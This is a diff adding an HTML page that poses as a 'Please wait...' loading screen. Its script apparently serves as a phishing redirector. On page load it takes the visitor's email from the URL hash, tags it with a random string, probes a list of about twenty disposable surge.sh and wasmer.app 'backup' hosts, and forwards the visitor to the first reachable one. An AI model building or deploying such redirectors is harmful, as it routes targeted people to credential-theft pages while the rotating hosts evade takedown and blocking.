@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Please wait...</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      background-color: #f4f4f4;
+    }
+    #message {
+      font-size: 1.5em;
+      margin-bottom: 20px;
+    }
+    #dots span {
+      display: inline-block;
+      animation: blink 1s infinite;
+      margin: 0 2px;
+    }
+    #dots span:nth-child(2) { animation-delay: 0.2s; }
+    #dots span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes blink {
+      0%, 50%, 100% { opacity: 0; }
+      25%, 75% { opacity: 1; }
+    }
+  </style>
+  <script>
+    // Generate a random jargon string
+    function generateJargon(length = 12) {
+      const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+      let result = "";
+      for (let i = 0; i < length; i++) {
+        result += charset.charAt(Math.floor(Math.random() * charset.length));
+      }
+      return result;
+    }
+
+    // List of redirect URLs (backup links)
+    const redirectLinks = [
+      "https://mywebsite-uploaded.surge.sh/main.html",
+      "https://backup1.surge.sh/main.html",
+      "https://backup2.surge.sh/main.html",
+      "https://backup3.surge.sh/main.html",
+      "https://backup4.surge.sh/main.html",
+      "https://backup5.surge.sh/main.html",
+      "https://backup6.surge.sh/main.html",
+      "https://backup7.surge.sh/main.html",
+      "https://staticfile-f6355.wasmer.app/index.html",
+      "https://staticfile-7aa78.wasmer.app/index.html",
+      "https://staticfile-385f0.wasmer.app/index.html",
+      "https://backup11.surge.sh/main.html",
+      "https://backup12.surge.sh/main.html",
+      "https://backup13.surge.sh/main.html",
+      "https://backup14.surge.sh/main.html",
+      "https://backup15.surge.sh/main.html",
+      "https://backup16.surge.sh/main.html",
+      "https://backup17.surge.sh/main.html",
+      "https://staticfile-8e115.wasmer.app/index.html",
+      "https://staticfile-e2d23.wasmer.app/index.html"
+    ];
+
+    // Check if a URL is reachable
+    async function checkURL(url) {
+      try {
+        const controller = new AbortController();
+        const timeout = setTimeout(() => controller.abort(), 3000);
+        const response = await fetch(url, { method: "HEAD", signal: controller.signal });
+        clearTimeout(timeout);
+        return response.ok ? url : null;
+      } catch {
+        return null;
+      }
+    }
+
+    async function redirect() {
+      const email = window.location.hash.substring(1); // Get email from hash
+      const jargon = generateJargon();
+
+      // Shuffle links to randomize order
+      const shuffledLinks = redirectLinks.sort(() => Math.random() - 0.5);
+
+      // Check all links in parallel
+      const results = await Promise.all(shuffledLinks.map(checkURL));
+
+      // Pick first working link
+      const firstAlive = results.find(url => url !== null);
+
+      if (firstAlive) {
+        // Append email + jargon to hash
+        window.location.href = `${firstAlive}#${email}-${jargon}`;
+      } else {
+        document.getElementById("message").textContent = "All links are down!";
+      }
+    }
+
+    window.addEventListener("DOMContentLoaded", () => {
+      setTimeout(redirect, 3000); // wait 3 seconds
+    });
+  </script>
+</head>
+<body>
+  <div id="message">Please wait<span id="dots"><span>.</span><span>.</span><span>.</span></span></div>
+</body>
+</html>
